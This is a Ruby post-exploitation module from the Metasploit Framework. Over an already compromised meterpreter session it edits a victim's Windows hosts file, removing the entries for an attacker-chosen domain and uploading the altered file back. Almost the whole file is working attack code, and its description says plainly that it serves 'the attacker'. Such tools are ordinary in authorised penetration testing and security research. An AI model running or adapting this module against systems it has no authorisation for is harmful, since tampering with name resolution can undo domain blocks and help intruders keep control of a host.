##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Post

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Host File Entry Removal',
			'Description'   => %q{
				This module allows the attacker to remove an entry from the Windows hosts file.
			},
			'License'       => BSD_LICENSE,
			'Author'        => [ 'vt <nick.freeman[at]security-assessment.com>'],
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptString.new('DOMAIN', [ true, 'Domain name to remove from the hosts file.' ])
			], self.class)
	end


	def run
		hosttoremove = datastore['DOMAIN']
		# remove hostname from hosts file
		fd = client.fs.file.new("C:\\WINDOWS\\System32\\drivers\\etc\\hosts", "r+b")

		# Get a temporary file path
		meterp_temp = Tempfile.new('meterp')
		meterp_temp.binmode
		temp_path = meterp_temp.path

		print_status("Removing hosts file entry pointing to #{hosttoremove}")

		newfile = ''
		fdray = fd.read.split("\r\n")

		fdray.each do |line|
			if line.match("\t#{hosttoremove}$")
			else
				newfile += "#{line}\r\n"
			end
		end

		fd.close

		meterp_temp.write(newfile)
		meterp_temp.close

		client.fs.file.upload_file('C:\\WINDOWS\\System32\\drivers\\etc\\hosts', meterp_temp)
		print_good("Done!")
	end

end
